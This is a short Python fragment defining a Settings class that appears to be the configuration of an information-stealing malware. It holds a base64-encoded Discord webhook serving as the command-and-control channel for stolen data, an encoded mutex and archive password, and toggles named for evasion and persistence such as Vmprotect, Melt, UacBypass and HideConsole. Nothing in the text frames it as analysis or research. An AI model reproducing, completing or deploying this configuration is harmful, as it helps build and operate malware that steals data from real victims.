...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIyNDA3NTYxMTMxMjc1NDc0OS9SY3FBUkdZXzVucHpiYm9Mb01lTWkyejN3NjRZREltMS1CN2NobmdXTVhsc3loMVQtUG9KNjEyWTRmMFFISHpVVW42bw==').decode())
    Mutex = base64.b64decode('Q3FoUXZSempYOFA0RURyag==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('bGFuZG9kZWUxNQ==').decode()
    HideConsole = bool('')
    Debug = bool('true')
